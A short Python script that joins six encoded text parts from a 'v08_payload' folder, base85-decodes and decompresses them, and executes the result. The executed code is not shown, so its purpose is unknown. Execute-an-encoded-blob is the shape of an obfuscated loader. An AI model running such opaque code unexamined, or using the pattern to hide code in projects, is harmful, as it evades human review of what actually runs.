#!/usr/bin/env python3
from __future__ import annotations
from pathlib import Path
import base64, zlib
parts = Path(__file__).with_name("v08_payload")
encoded = "".join((parts / f"part{i}.txt").read_text(encoding="utf-8").strip() for i in range(6))
source = zlib.decompress(base64.b85decode(encoded.encode())).decode("utf-8")
exec(compile(source, __file__ + "::<expanded>", "exec"), {"__name__": "__main__", "__file__": __file__})
